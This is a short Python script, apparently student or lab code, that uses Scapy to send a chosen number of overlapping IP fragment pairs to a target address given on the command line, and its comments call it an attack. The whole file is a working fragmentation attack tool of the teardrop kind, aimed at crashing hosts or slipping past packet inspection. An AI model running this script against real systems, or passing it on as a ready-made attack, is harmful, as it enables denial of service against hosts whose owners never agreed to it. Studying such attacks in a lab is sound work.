from scapy.all import * #this code was written by Dina
import random as rand
dest=str(sys.argv[1])#the user inputs the ip destination as the first argument after the filename when running the attack
nbofpkts=str(sys.argv[2])#the users input the desired number of fragments they'd like to send as the second argument after the destination ip
for i in range(int(nbofpkts)): #overlapping fragments with UDP protocol
    data1="0"*800
    data2= "1"*100
    f1=IP(dst=dest, id=1000, flags="MF", frag=0)/UDP(dport=80)/data1 #first fragment with data length 800, offset 0, a UDP layer and MF set to one to indicate more fragments S
    f2=IP(dst=dest, id=1000, flags=0, frag=2)/data2 #second fragment with offset 16, this will overlap with fragment 1
    send(f1)
    send(f2)
